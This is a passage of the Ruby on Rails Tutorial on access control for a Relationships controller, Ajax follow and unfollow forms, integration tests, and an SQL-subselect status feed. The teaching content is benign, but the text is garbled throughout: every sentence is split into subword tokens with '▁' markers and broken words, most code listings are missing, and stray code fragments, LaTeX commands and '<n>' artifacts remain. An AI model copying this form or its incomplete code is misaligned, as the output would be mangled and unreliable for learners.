▁As ▁we ' ll ▁see ▁in ▁Listing ~\ ref { code : relationships _ controller }, ▁enforc ing ▁access ▁control ▁on ▁the ▁Relationship s ▁controller ▁actions ▁won ' t ▁much ▁matter , ▁but ▁we ' ll ▁ still ▁follow ▁our ▁previous ▁practice ▁of ▁enforc ing ▁the ▁security ▁model ▁as ▁ early ▁as ▁possible .
▁In ▁particular , ▁we ' ll ▁check ▁that ▁attempt s ▁to ▁access ▁actions ▁in ▁the ▁Relationship s ▁controller ▁require ▁a ▁logged - in ▁user ▁( and ▁thus ▁get ▁redirect ed ▁to ▁the ▁login ▁page ), ▁while ▁also ▁not ▁changing ▁the ▁Relationship ▁count , ▁as ▁show n ▁in ▁Listing ~\ ref { code : relationships _ access _ control }.
▁B as ic ▁access ▁control ▁tests ▁for ▁relationships .
▁We ▁can ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : relationships _ access _ control } ▁to ▁pass ▁by ▁adding ▁the ▁\ k ode { logged \_ in \_ user } ▁before ▁filter ▁( Listing ~\ ref { code : relationships _ controller }).
▁Access ▁control ▁for ▁relationships .
▁The ▁full ▁implementation ▁appears ▁in ▁Listing ~\ ref { code : relationships _ controller _ following }.
▁The ▁Relationship s ▁controller .
▁We ▁can ▁see ▁from ▁Listing ~\ ref { code : relationships _ controller _ following } ▁why ▁the ▁security ▁issue ▁mentioned ▁above ▁is ▁minor : ▁if ▁an ▁un logged - in ▁user ▁were ▁to ▁hit ▁either ▁action ▁directly ▁( e . g . , ▁using ▁a ▁command - line ▁tool ▁like ▁\ k ode { curl }), ▁\ k ode { current \_ user } ▁would ▁be ▁\ k ode { nil }, ▁and ▁in ▁both ▁cases ▁the ▁action ' s ▁second ▁line ▁would ▁raise ▁an ▁exception , ▁result ing ▁in ▁an ▁error ▁but ▁no ▁harm ▁to ▁the ▁application ▁or ▁its ▁data .
▁It ' s ▁best ▁not ▁to ▁rely ▁on ▁that , ▁though , ▁so ▁we ' ve ▁take n ▁the ▁extra ▁step ▁and ▁added ▁an ▁ additional ▁layer ▁of ▁security .
▁With ▁that , ▁the ▁core ▁follow / unfollow ▁functionality ▁is ▁complete , ▁and ▁any ▁user ▁can ▁follow ▁or ▁unfollow ▁any ▁other ▁user , ▁as ▁you ▁can ▁verify ▁by ▁click ing ▁the ▁corresponding ▁button s ▁in ▁your ▁browser .
▁( We ' ll ▁write ▁integration ▁tests ▁to ▁verify ▁this ▁behavior ▁in ▁Section ~\ ref { sec : following _ tests }. )
▁An ▁unfollow ed ▁user .
▁The ▁result ▁of ▁following ▁an ▁unfollow ed ▁user .
▁A lthough ▁our ▁user ▁following ▁implementation ▁is ▁complete ▁as ▁it ▁stand s , ▁we ▁have ▁one ▁bit ▁of ▁polish ▁left ▁to ▁add ▁before ▁starting ▁work ▁on ▁the ▁status ▁feed .
▁You ▁may ▁have ▁notice d ▁in ▁Section ~\ ref { sec : a _ working _ follow _ button _ the _ standard _ way } ▁that ▁both ▁the ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁in ▁the ▁Relationship s ▁controller ▁simply ▁redirect ▁\ emph { back } ▁to ▁the ▁original ▁profile .
▁In ▁other ▁words , ▁a ▁user ▁start s ▁on ▁another ▁user ' s ▁profile ▁page , ▁follows ▁the ▁other ▁user , ▁and ▁is ▁immediately ▁redirect ed ▁back ▁to ▁the ▁original ▁page .
▁It ▁is ▁reason able ▁to ▁as k ▁why ▁the ▁user ▁needs ▁to ▁leave ▁that ▁page ▁at ▁all .
▁This ▁is ▁exactly ▁the ▁problem ▁solve d ▁by ▁\ emph { A j a x }, ▁which ▁allows ▁web ▁pages ▁to ▁send ▁requests ▁a synchronously ▁to ▁the ▁server ▁without ▁leav ing ▁the ▁page
▁Because ▁it ▁is ▁no m inally ▁an ▁ acronym ▁for ▁\ emph { as y n ch r on ous ▁JavaScript ▁and ▁ X ML }, ▁Ajax ▁is ▁some times ▁m is s p e ll ed ▁`` A J A X '' , ▁even ▁though ▁the ▁\ href { http :// www . adapt ive path . com / id e as / ajax - new - app r o a ch - web - application s /}{ origin al ▁Ajax ▁article } ▁sp e ll s ▁it ▁as ▁`` A j a x '' ▁throughout .
▁Because ▁adding ▁Ajax ▁to ▁web ▁forms ▁is ▁a ▁common ▁practice , ▁Rails ▁make s ▁Ajax ▁easy ▁to ▁implement .
▁Inde ed , ▁updating ▁the ▁follow / unfollow ▁form ▁partials ▁is ▁tr i via l : ▁just ▁change
▁form _ for
▁and ▁Rails ▁\ href { http :// cat b . org / j argon / html / A / automagically . html }{ automagically } ▁uses ▁Ajax
▁A ▁form ▁for ▁following ▁a ▁user ▁using ▁Ajax .
▁A ▁form ▁for ▁unfollow ing ▁a ▁user ▁using ▁Ajax .
▁The ▁actual ▁HTML ▁generated ▁by ▁this ▁ERb ▁is n ' t ▁particular ly ▁relevant , ▁but ▁you ▁m ight ▁be ▁curious , ▁so ▁here ' s ▁a ▁p e e k ▁at ▁a ▁schematic ▁view ▁( de t a il s ▁may ▁differ ) :
▁</ form >
▁This ▁set s ▁the ▁variable ▁\ k ode { data - remote =" true "} ▁inside ▁the ▁form ▁tag , ▁which ▁tell s ▁Rails ▁to ▁allow ▁the ▁form ▁to ▁be ▁handle d ▁by ▁JavaScript .
▁By ▁using ▁a ▁simple ▁HTML ▁property ▁instead ▁of ▁insert ing ▁the ▁full ▁JavaScript ▁code ▁( as ▁in ▁previous ▁versions ▁of ▁Rails ), ▁Rails ▁follows ▁the ▁ ph i lo so ph y ▁of ▁\ href { http :// r ailscasts . com / episodes / 20 5 - u nobtrusive - javascript }{\ emph { u nobtrusive ▁JavaScript } }.
▁Having ▁updated ▁the ▁form , ▁we ▁now ▁need ▁to ▁arrange ▁for ▁the ▁Relationship s ▁controller ▁to ▁respond ▁to ▁Ajax ▁requests .
▁We ▁can ▁do ▁this ▁using ▁the ▁\ k ode { respond \_ to } ▁method , ▁respond ing ▁appropriate ly ▁depending ▁on ▁the ▁type ▁of ▁request . ▁The ▁general ▁pattern ▁look s ▁like ▁this :
▁The ▁syntax ▁is ▁ potentially ▁confusing , ▁and ▁it ' s ▁important ▁to ▁understand ▁that ▁in ▁the ▁code ▁above ▁only ▁\ emph { one } ▁of ▁the ▁lines ▁get s ▁executed .
▁( In ▁this ▁sense , ▁\ k ode { respond \_ to } ▁is ▁more ▁like ▁an ▁if - the n - else ▁statement ▁than ▁a ▁series ▁of ▁ s equ en tial ▁lines .)
▁A d ap ting ▁the ▁Relationship s ▁controller ▁to ▁respond ▁to ▁Ajax ▁involve s ▁adding ▁\ k ode { respond \_ to } ▁as ▁above ▁to ▁the ▁\ k ode { create } ▁and ▁\ k ode { destroy } ▁actions ▁from ▁Listing ~\ ref { code : relationships _ controller _ following }.
▁The ▁result ▁appears ▁as ▁in ▁Listing ~\ ref { code : relationships _ controller _ ajax }.
▁Note ▁the ▁change ▁from ▁the ▁local ▁variable ▁\ k ode { user } ▁to ▁the ▁instance ▁variable ▁\ k ode {@ user } ; ▁in ▁Listing ~\ ref { code : relationships _ controller _ following } ▁there ▁was ▁no ▁need ▁for ▁an ▁instance ▁variable , ▁but ▁now ▁such ▁a ▁variable ▁is ▁necessary ▁for ▁use ▁in ▁Listing ~\ ref { code : follow _ form _ ajax } ▁and ▁Listing ~\ ref { code : unfollow _ form _ ajax }.
▁Re s p on d ing ▁to ▁Ajax ▁requests ▁in ▁the ▁Relationship s ▁controller .
▁The ▁actions ▁in ▁Listing ~\ ref { code : relationships _ controller _ ajax } ▁ de grade ▁gra ce full y , ▁which ▁means ▁that ▁they ▁work ▁fine ▁in ▁browsers ▁that ▁have ▁JavaScript ▁disable d ▁( a lthough ▁a ▁small ▁amount ▁of ▁configuration ▁is ▁necessary , ▁as ▁show n ▁in ▁Listing ~\ ref { code : de grade _ gr a ce full y }).
▁Configuration ▁needed ▁for ▁gra ce ful ▁ de gr ad ation ▁of ▁form ▁submission .
▁# ▁ Includ e ▁the ▁ authenticity ▁token ▁in ▁remote ▁forms .
▁On ▁the ▁other ▁hand , ▁we ▁have ▁yet ▁to ▁respond ▁properly ▁when ▁JavaScript ▁is ▁enabled .
▁In ▁the ▁case ▁of ▁an ▁Ajax ▁request , ▁Rails ▁automatically ▁calls ▁a ▁\ emph { JavaScript ▁ embedded ▁Ruby } ▁(\ k ode { . js . erb }) ▁file ▁with ▁the ▁same ▁name ▁as ▁the ▁action , ▁i . e . , ▁\ k ode { create . js . erb } ▁or ▁\ k ode { destroy . js . erb }.
▁As ▁you ▁m ight ▁guess , ▁such ▁files ▁allow ▁us ▁to ▁mix ▁JavaScript ▁and ▁ embedded ▁Ruby ▁to ▁perform ▁actions ▁on ▁the ▁current ▁page .
▁It ▁is ▁these ▁files ▁that ▁we ▁need ▁to ▁create ▁and ▁edit ▁in ▁order ▁to ▁update ▁the ▁user ▁profile ▁page ▁upon ▁being ▁followed ▁or ▁unfollow ed .
▁In side ▁a ▁ JS - ER b ▁file , ▁Rails ▁automatically ▁provides ▁the ▁\ href { http :// jquery . com /}{ j Query } ▁JavaScript ▁helpers ▁to ▁manipulate ▁the ▁page ▁using ▁the ▁\ href { http :// www . w 3 . org / D O M /}{ Do c u ment ▁Object ▁Model ▁( D O M ) }.
▁The ▁jQuery ▁library ▁( which ▁we ▁saw ▁brief ly ▁in ▁Section ~\ ref { sec : image _ validation }) ▁provides ▁a ▁large ▁number ▁of ▁methods ▁for ▁m anipulating ▁the ▁DOM , ▁but ▁here ▁we ▁will ▁need ▁only ▁two .
▁First , ▁we ▁will ▁need ▁to ▁know ▁about ▁the ▁do ll ar - sign ▁syntax ▁to ▁access ▁a ▁DOM ▁element ▁base d ▁on ▁its ▁unique ▁CSS ~ id .
▁For ▁example , ▁to ▁manipulate ▁the ▁\ k ode { follow \_ form } ▁element , ▁we ▁will ▁use ▁the ▁syntax
▁( Re c all ▁from ▁Listing ~\ ref { code : follow _ form _ partial } ▁that ▁this ▁is ▁a ▁\ k ode { div } ▁that ▁wrap s ▁the ▁form , ▁not ▁the ▁form ▁itself .)
▁As ▁you ▁m ight ▁guess , ▁jQuery , ▁like ▁CSS , ▁uses ▁a ▁do t ~\ k ode { . } \ ▁to ▁manipulate ▁CSS ▁classes .
▁The ▁second ▁method ▁we ' ll ▁need ▁is ▁\ k ode { html }, ▁which ▁update s ▁the ▁HTML ▁inside ▁the ▁relevant ▁element ▁with ▁the ▁contents ▁of ▁its ▁argument .
▁For ▁example , ▁to ▁replace ▁the ▁entire ▁follow ▁form ▁with ▁the ▁string ▁\ k ode {" foobar " }, ▁we ▁would ▁write
▁Un like ▁plain ▁JavaScript ▁files , ▁ JS - ER b ▁files ▁also ▁allow ▁the ▁use ▁of ▁ embedded ▁Ruby , ▁which ▁we ▁apply ▁in ▁the ▁\ k ode { create . js . erb } ▁file ▁to ▁update ▁the ▁follow ▁form ▁with ▁the ▁\ k ode { unfollow } ▁partial ▁( which ▁is ▁what ▁should ▁show ▁after ▁a ▁successful ▁following ) ▁and ▁update ▁the ▁follower ▁count .
▁The ▁result ▁is ▁show n ▁in ▁Listing ~\ ref { code : create _ js _ erb }.
▁This ▁uses ▁the ▁\ k ode { escape \_ javascript } ▁method , ▁which ▁is ▁needed ▁to ▁escape ▁out ▁the ▁result ▁when ▁insert ing ▁HTML ▁in ▁a ▁JavaScript ▁file .
▁The ▁JavaScript ▁ embedded ▁Ruby ▁to ▁create ▁a ▁following ▁relationship .
▁Note ▁the ▁presence ▁of ▁line - end ing ▁semi co lo n s , ▁which ▁are ▁character ist ic ▁of ▁languages ▁with ▁syntax ▁ de sc end ed ▁from ▁\ href { https :// en . wiki p edia . org / wiki / A L G O L }{ A L G O L }.
▁The ▁\ k ode { destroy . js . erb } ▁file ▁is ▁analogous ▁( Listing ~\ ref { code : destroy _ js _ erb }).
▁The ▁Ruby ▁JavaScript ▁( R JS ) ▁to ▁destroy ▁a ▁following ▁relationship .
▁With ▁that , ▁you ▁should ▁navigate ▁to ▁a ▁user ▁profile ▁page ▁and ▁verify ▁that ▁you ▁can ▁follow ▁and ▁unfollow ▁without ▁a ▁page ▁refresh .
▁Now ▁that ▁the ▁follow ▁button s ▁are ▁working , ▁we ' ll ▁write ▁some ▁simple ▁tests ▁to ▁prevent ▁re gr es s ion s .
▁To ▁follow ▁a ▁user , ▁we ▁post ▁to ▁the ▁relationships ▁path ▁and ▁verify ▁that ▁the ▁number ▁of ▁followed ▁users ▁increase s ▁by ~ 1 :
▁This ▁tests ▁the ▁standard ▁implementation , ▁but ▁testing ▁the ▁Ajax ▁version ▁is ▁ almost ▁the ▁same , ▁with ▁\ k ode { xhr ▁: post } ▁in ▁place ▁of ▁plain ▁\ k ode { post } :
▁This ▁uses ▁the ▁\ k ode { xhr } ▁method ▁( for ▁ X m l Http Request ) ▁to ▁issue ▁an ▁Ajax ▁request , ▁which ▁cause s ▁the ▁\ k ode { respond \_ to } ▁block ▁in ▁Listing ~\ ref { code : relationships _ controller _ ajax } ▁to ▁execute ▁the ▁proper ▁JavaScript ▁method .
▁The ▁same ▁parallel ▁structure ▁applies ▁to ▁deleting ▁users , ▁with ▁\ k ode { delete } ▁instead ▁of ▁\ k ode { post }.
▁Here ▁we ▁check ▁that ▁the ▁followed ▁user ▁count ▁go es ▁down ▁by ~ 1 ▁and ▁include ▁the ▁relationship ▁and ▁followed ▁user ' s ▁id :
▁P utting ▁the ▁two ▁cases ▁together ▁gives ▁the ▁tests ▁in ▁Listing ~\ ref { code : follow _ button _ tests }.
▁Tests ▁for ▁the ▁follow ▁and ▁unfollow ▁button s .
▁We ▁come ▁now ▁to ▁the ▁p in n ac le ▁of ▁our ▁sample ▁application : ▁the ▁status ▁feed ▁of ▁microposts .
▁App r o p r i ate ly , ▁this ▁section ▁contains ▁some ▁of ▁the ▁most ▁advanced ▁material ▁in ▁the ▁entire ▁tutorial .
▁The ▁full ▁status ▁feed ▁build s ▁on ▁the ▁proto - feed ▁from ▁Section ~\ ref { sec : a _ proto _ feed } ▁by ▁as s em b l ing ▁an ▁array ▁of ▁the ▁microposts ▁from ▁the ▁users ▁being ▁followed ▁by ▁the ▁current ▁user , ▁along ▁with ▁the ▁current ▁user ' s ▁own ▁microposts .
▁Through out ▁this ▁section , ▁we ' ll ▁proceed ▁through ▁a ▁series ▁of ▁feed ▁implementation s ▁of ▁increasing ▁sophistication .
▁To ▁accomplish ▁this , ▁we ▁will ▁need ▁some ▁fai r ly ▁advanced ▁Rails , ▁Ruby , ▁and ▁even ▁SQL ▁programming ▁technique s .
▁Because ▁of ▁the ▁heav y ▁ li f ting ▁a head , ▁it ' s ▁es pecially ▁important ▁to ▁review ▁where ▁we ' re ▁going .
▁A ▁re ca p ▁of ▁the ▁final ▁status ▁feed , ▁show n ▁in ▁F igure ~\ ref { fig : page _ flow _ home _ page _ feed _ mockup }, ▁appears ▁again ▁in ▁F igure ~\ ref { fig : home _ page _ feed _ mockup }.
▁A ▁mockup ▁of ▁a ▁user ' s ▁Home ▁page ▁with ▁a ▁status ▁feed .
▁\ label { fig : home _ page _ feed _ mockup } }< n >\ end { figure }< n >< n > ▁% ▁section ▁the _ status _ feed ▁( end )< n >< n > ▁\ subsection { M o t i v ation ▁and ▁strategy } ▁% ▁( fold )< n > ▁\ label { sec : motivation _ and _ s trategy }< n >< n >
▁The ▁basic ▁idea ▁be h in d ▁the ▁feed ▁is ▁simple .
▁The ▁purpose ▁of ▁a ▁feed ▁is ▁to ▁pull ▁out ▁the ▁microposts ▁who se ▁user ▁id s ▁correspond ▁to ▁the ▁users ▁being ▁followed ▁by ▁the ▁current ▁user ▁( and ▁the ▁current ▁user ▁itself ), ▁as ▁indicate d ▁by ▁the ▁a r row s ▁in ▁the ▁diagram .
▁The ▁feed ▁for ▁a ▁user ▁( id ▁1) ▁following ▁users ▁with ▁id s ▁2, ▁7 , ▁ 8 , ▁and ▁10 .
▁The ▁key ▁is ▁to ▁check ▁all ▁three ▁requirements ▁for ▁the ▁feed : ▁microposts ▁for ▁both ▁followed ▁users ▁and ▁the ▁user ▁itself ▁should ▁be ▁included ▁in ▁the ▁feed , ▁but ▁a ▁post ▁from ▁an ▁\ emph { unfollow ed } ▁user ▁should ▁not ▁be ▁included .
▁ Base d ▁on ▁the ▁fixtures ▁in ▁Listing ~\ ref { code : users _ fixtures _ ext ra _ users } ▁and ▁Listing ~\ ref { code : add _ micropost _ different _ own er }, ▁this ▁means ▁that ▁ Michael ▁should ▁see ▁L an a ' s ▁posts ▁and ▁his ▁own ▁posts , ▁but ▁not ▁A r ch er ' s ▁posts .
▁Convert ing ▁these ▁requirements ▁to ▁assertion s ▁and ▁recall ing ▁that ▁the ▁\ k ode { feed } ▁is ▁in ▁the ▁User ▁model ▁( Listing ~\ ref { code : proto _ status _ feed }) ▁gives ▁the ▁updated ▁User ▁model ▁test ▁show n ▁in ▁Listing ~\ ref { code : full _ feed _ test }.
▁A ▁test ▁for ▁the ▁status ▁feed .
▁S ince ▁the ▁final ▁feed ▁implementation ▁is ▁rather ▁in tr ic ate , ▁we ' ll ▁build ▁up ▁to ▁it ▁by ▁introduc ing ▁one ▁piece ▁at ▁a ▁time .
▁The ▁first ▁step ▁is ▁to ▁think ▁of ▁the ▁kind ▁of ▁query ▁we ' ll ▁need .
▁We ▁need ▁to ▁select ▁all ▁the ▁microposts ▁from ▁the ▁\ k ode { microposts } ▁table ▁with ▁id s ▁corresponding ▁to ▁the ▁users ▁being ▁followed ▁by ▁a ▁given ▁user ▁( or ▁the ▁user ▁itself ).
▁We ▁m ight ▁write ▁this ▁schematic ally ▁as ▁follows :
▁microposts
▁In ▁writing ▁this ▁code , ▁we ' ve ▁guess ed ▁that ▁SQL ▁supports ▁an ▁\ k ode { IN } ▁keyword ▁that ▁allows ▁us ▁to ▁test ▁for ▁set ▁inclusion . ▁( H appily , ▁it ▁does .)
▁Recall ▁from ▁the ▁proto - feed ▁in ▁Section ~\ ref { sec : a _ proto _ feed } ▁that ▁Active ▁Record ▁uses ▁the ▁\ k ode { where } ▁method ▁to ▁accomplish ▁the ▁kind ▁of ▁select ▁show n ▁above , ▁as ▁illustrate d ▁in ▁Listing ~\ ref { code : proto _ status _ feed }.
▁There , ▁our ▁select ▁was ▁very ▁simple ; ▁we ▁just ▁ pick ed ▁out ▁all ▁the ▁microposts ▁with ▁user ▁id ▁corresponding ▁to ▁the ▁current ▁user :
▁Here , ▁we ▁expect ▁it ▁to ▁be ▁more ▁complicated , ▁something ▁like ▁this :
▁We ▁see ▁from ▁these ▁conditions ▁that ▁we ' ll ▁need ▁an ▁array ▁of ▁id s ▁corresponding ▁to ▁the ▁users ▁being ▁followed .
▁One ▁way ▁to ▁do ▁this ▁is ▁to ▁use ▁Ruby ' s ▁\ k ode { map } ▁method , ▁available ▁on ▁any ▁`` e numerable '' ▁object , ▁i . e . , ▁any ▁object ▁( such ▁as ▁an ▁ Array ▁or ▁a ▁ Hash ) ▁that ▁consist s ▁of ▁a ▁collection ▁of ▁elements
▁The ▁main ▁requirement ▁is ▁that ▁e numerable ▁objects ▁must ▁implement ▁an ▁\ k ode { each } ▁method ▁to ▁iterate ▁through ▁the ▁collection .
▁We ▁saw ▁an ▁example ▁of ▁this ▁method ▁in ▁Section ~\ ref { sec : block s } ; ▁as ▁another ▁example , ▁we ' ll ▁use ▁\ k ode { map } ▁to ▁convert ▁an ▁array ▁of ▁integer s ▁to ▁an ▁array ▁of ▁strings :
▁=> ▁[ "1" , ▁" 2 ", ▁" 3 ", ▁" 4 "]
▁Using ▁the ▁\ k ode { join } ▁method ▁( Section ~\ ref { sec : array s _ and _ range s }), ▁we ▁can ▁create ▁a ▁string ▁composed ▁of ▁the ▁id s ▁by ▁join ing ▁them ▁on ▁com ma - space ▁:
▁=> ▁" 1, ▁2, ▁3 , ▁4 "
▁We ▁can ▁use ▁the ▁above ▁method ▁to ▁construct ▁the ▁necessary ▁array ▁of ▁followed ▁user ▁id s ▁by ▁calling ~\ k ode { id } ▁on ▁each ▁element ▁in ▁\ k ode { user . following }.
▁For ▁example , ▁for ▁the ▁first ▁user ▁in ▁the ▁database ▁this ▁array ▁appears ▁as ▁follows :
▁=> ▁[ 4 , ▁5 , ▁6 , ▁7 , ▁ 8 , ▁ 9 , ▁10 , ▁ 11 , ▁ 12 , ▁1 3 , ▁1 4 , ▁ 15 , ▁ 16 , ▁ 17 , ▁ 18 , ▁ 19 , ▁20 , ▁2 1, ▁ 22 , ▁ 23 ,
▁24 , ▁2 5 , ▁2 6 , ▁ 27 , ▁28 , ▁29 , ▁30 , ▁31 , ▁3 2 , ▁3 3 , ▁ 34 , ▁3 5 , ▁ 36 , ▁ 37 , ▁ 38 , ▁ 39 , ▁4 0, ▁4 1, ▁42 ,
▁4 3 , ▁ 44 , ▁4 5 , ▁4 6 , ▁4 7 , ▁4 8 , ▁4 9 , ▁50 , ▁5 1 ]
▁In ▁fact , ▁because ▁this ▁sort ▁of ▁construction ▁is ▁so ▁useful , ▁Active ▁Record ▁provides ▁it ▁by ▁default :
▁Here ▁the ▁\ k ode { following \_ id s } ▁method ▁is ▁ s y n the size d ▁by ▁Active ▁Record ▁base d ▁on ▁the ▁\ k ode { has \_ many ▁: following } ▁association ▁( Listing ~\ ref { code : has _ many _ following _ through _ active _ relationships }) ; ▁the ▁result ▁is ▁that ▁we ▁need ▁only ▁app end ▁\ k ode { \_ id s } ▁to ▁the ▁association ▁name ▁to ▁get ▁the ▁id s ▁corresponding ▁to ▁the ▁\ k ode { user . following } ▁collection .
▁A ▁string ▁of ▁followed ▁user ▁id s ▁the n ▁appears ▁as ▁follows :
▁=> ▁" 4 , ▁5 , ▁6 , ▁7 , ▁ 8 , ▁ 9 , ▁10 , ▁ 11 , ▁ 12 , ▁1 3 , ▁1 4 , ▁ 15 , ▁ 16 , ▁ 17 , ▁ 18 , ▁ 19 , ▁20 , ▁2 1, ▁ 22 , ▁ 23 ,
▁4 3 , ▁ 44 , ▁4 5 , ▁4 6 , ▁4 7 , ▁4 8 , ▁4 9 , ▁50 , ▁5 1 "
▁When ▁insert ing ▁into ▁an ▁SQL ▁string , ▁though , ▁you ▁don ' t ▁need ▁to ▁do ▁this ; ▁the ▁\ k ode { ?}\ ▁interpolation ▁take s ▁care ▁of ▁it ▁for ▁you ▁( and ▁in ▁fact ▁eliminate s ▁some ▁database - dependent ▁in com p at i b il it ies ).
▁This ▁means ▁we ▁can ▁use ▁\ k ode { following \_ id s } ▁by ▁itself .
▁As ▁a ▁result , ▁the ▁initial ▁guess ▁of
▁actually ▁works !
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : initial _ working _ feed }
▁The ▁initial ▁working ▁feed .
▁# ▁Return s ▁a ▁user ' s ▁status ▁feed .
▁The ▁test ▁suite ▁should ▁be ▁\ passing :
▁In ▁some ▁applications , ▁this ▁initial ▁implementation ▁m ight ▁be ▁good ▁enough ▁for ▁most ▁practical ▁purposes , ▁but ▁Listing ~\ ref { code : initial _ working _ feed } ▁is n ' t ▁the ▁final ▁implementation ; ▁see ▁if ▁you ▁can ▁make ▁a ▁guess ▁about ▁why ▁not ▁before ▁mov ing ▁on ▁to ▁the ▁next ▁section .
▁(\ emph { Hint } : ▁What ▁if ▁a ▁user ▁is ▁following ▁5 000 ▁other ▁users ? )
▁As ▁hint ed ▁at ▁in ▁the ▁last ▁section , ▁the ▁feed ▁implementation ▁in ▁Section ~\ ref { sec : a _ first _ feed _ implementation } ▁does n ' t ▁scale ▁well ▁when ▁the ▁number ▁of ▁microposts ▁in ▁the ▁feed ▁is ▁large , ▁as ▁would ▁likely ▁happen ▁if ▁a ▁user ▁were ▁following , ▁say , ▁5 000 ▁other ▁users .
▁In ▁this ▁section , ▁we ' ll ▁re implement ▁the ▁status ▁feed ▁in ▁a ▁way ▁that ▁scale s ▁better ▁with ▁the ▁number ▁of ▁followed ▁users .
▁The ▁problem ▁with ▁the ▁code ▁in ▁Section ~\ ref { sec : a _ first _ feed _ implementation } ▁is ▁that ▁\ k ode { following \_ id s } ▁pull s ▁\ emph { all } ▁the ▁followed ▁users ' ▁id s ▁into ▁memory , ▁and ▁creates ▁an ▁array ▁the ▁full ▁length ▁of ▁the ▁followed ▁users ▁array .
▁S ince ▁the ▁condition ▁in ▁Listing ~\ ref { code : initial _ working _ feed } ▁actually ▁just ▁check s ▁inclusion ▁in ▁a ▁set , ▁there ▁must ▁be ▁a ▁more ▁ efficient ▁way ▁to ▁do ▁this , ▁and ▁in de ed ▁SQL ▁is ▁optimized ▁for ▁just ▁such ▁set ▁operations .
▁The ▁solution ▁involve s ▁push ing ▁the ▁find ing ▁of ▁followed ▁user ▁id s ▁into ▁the ▁database ▁using ▁a ▁\ emph { subselect }.
▁We ' ll ▁start ▁by ▁refactoring ▁the ▁feed ▁with ▁the ▁slightly ▁modified ▁code ▁in ▁Listing ~\ ref { code : feed _ second _ cut }.
▁Using ▁key - value ▁pair s ▁in ▁the ▁feed ' s ▁\ k ode { where } ▁method .
▁following
▁As ▁prepar ation ▁for ▁the ▁next ▁step , ▁we ▁have ▁replaced
▁with ▁the ▁equivalent
▁following
▁The ▁question ▁mark ▁syntax ▁is ▁fine , ▁but ▁when ▁we ▁want ▁the ▁\ emph { s a me } ▁variable ▁inserted ▁in ▁more ▁than ▁one ▁place , ▁the ▁second ▁syntax ▁is ▁more ▁convenient .
▁The ▁above ▁discussion ▁implie s ▁that ▁we ▁will ▁be ▁adding ▁a ▁\ emph { second } ▁occur r ence ▁of ▁\ k ode { user \_ id } ▁in ▁the ▁SQL ▁query .
▁In ▁particular , ▁we ▁can ▁replace ▁the ▁Ruby ▁code
▁with ▁the ▁SQL ▁ s n ip p et
▁This ▁code ▁contains ▁an ▁SQL ▁ subselect , ▁and ▁internally ▁the ▁entire ▁select ▁for ▁user ~ 1 ▁would ▁look ▁something ▁like ▁this :
▁This ▁ subselect ▁arrange s ▁for ▁all ▁the ▁set ▁logic ▁to ▁be ▁push ed ▁into ▁the ▁database , ▁which ▁is ▁more ▁ efficient
▁With ▁this ▁foundation , ▁we ▁are ▁ready ▁for ▁a ▁more ▁ efficient ▁feed ▁implementation , ▁as ▁seen ▁in ▁Listing ~\ ref { code : feed _ final }.
▁The ▁final ▁implementation ▁of ▁the ▁feed .
▁WHERE ▁follower _ id ▁= ▁: user _ id "
▁This ▁code ▁has ▁a ▁form id able ▁combination ▁of ▁Rails , ▁Ruby , ▁and ▁SQL , ▁but ▁it ▁does ▁the ▁job , ▁and ▁does ▁it ▁well :
▁Of ▁course , ▁even ▁the ▁ subselect ▁won ' t ▁scale ▁for ever .
▁For ▁big g er ▁site s , ▁you ▁would ▁ probably ▁need ▁to ▁generate ▁the ▁feed ▁a synchronously ▁using ▁a ▁background ▁job , ▁but ▁such ▁scaling ▁subtle t ies ▁are ▁ beyond ▁the ▁scope ▁of ▁this ▁tutorial .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : feed _ final }, ▁our ▁status ▁feed ▁is ▁now ▁complete .
▁Recall ▁from ▁Section ~\ ref { sec : a _ proto _ feed } ▁that ▁the ▁Home ▁page ▁already ▁includes ▁the ▁feed ; ▁as ▁a ▁remind er , ▁the ▁\ k ode { home } ▁action ▁appears ▁again ▁in ▁Listing ~\ ref { code : re al _ feed _ instance _ variable }.
▁In ▁Chapter ~\ ref { cha : user _ microposts }, ▁the ▁result ▁was ▁only ▁a ▁proto - feed ▁( F igure ~\ ref { fig : home _ with _ proto _ feed }), ▁but ▁with ▁the ▁implementation ▁in ▁Listing ~\ ref { code : feed _ final } ▁as ▁seen ▁in ▁F igure ~\ ref { fig : home _ page _ with _ feed } ▁the ▁Home ▁page ▁now ▁shows ▁the ▁full ▁feed .
▁The ▁\ k ode { home } ▁action ▁with ▁a ▁ paginate d ▁feed .
▁The ▁Home ▁page ▁with ▁a ▁working ▁status ▁feed .
▁At ▁this ▁point , ▁we ' re ▁ready ▁to ▁merge ▁our ▁changes ▁into ▁the ▁master ▁branch :
▁We ▁can ▁the n ▁push ▁the ▁code ▁to ▁the ▁remote ▁repository ▁and ▁deploy ▁the ▁application ▁to ▁production :
▁The ▁result ▁is ▁a ▁working ▁status ▁feed ▁on ▁the ▁live ▁Web ▁( F igure ~\ ref { fig : li ve _ status _ feed }).
▁A ▁working ▁status ▁feed ▁on ▁the ▁live ▁Web .
▁With ▁the ▁addition ▁of ▁the ▁status ▁feed , ▁we ' ve ▁finished ▁the ▁sample ▁application ▁for ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }.
▁This ▁application ▁includes ▁examples ▁of ▁all ▁the ▁major ▁features ▁of ▁Rails , ▁including ▁models , ▁views , ▁controllers , ▁templates , ▁partials , ▁filter s , ▁validations , ▁callbacks , ▁\ k ode { has \_ many } / \ k ode { belongs \_ to } ▁and ▁\ k ode { has \_ many ▁: through } ▁associations , ▁security , ▁testing , ▁and ▁deployment .
▁De s p ite ▁this ▁i mp re s s ive ▁list , ▁there ▁is ▁ still ▁much ▁to ▁learn ▁about ▁web ▁development .
▁As ▁a ▁first ▁step ▁in ▁this ▁process , ▁this ▁section ▁contains ▁some ▁suggest ion s ▁for ▁further ▁learning .
▁< n >< n > ▁\ subsection { G u id e ▁to ▁further ▁resources } ▁% ▁( fold )< n > ▁\ label { sec : guid e _ to _ f urther _ resources }< n >< n >
▁There ▁is ▁a ▁we al th ▁of ▁Rails ▁resources ▁in ▁store s ▁and ▁on ▁the ▁web --- in de ed , ▁the ▁supply ▁is ▁so ▁rich ▁that ▁it ▁can ▁be ▁over w hel m ing .
▁The ▁good ▁new s ▁is ▁that , ▁ having ▁go tt en ▁this ▁far , ▁you ' re ▁ready ▁for ▁ almost ▁anything ▁else ▁out ▁there .
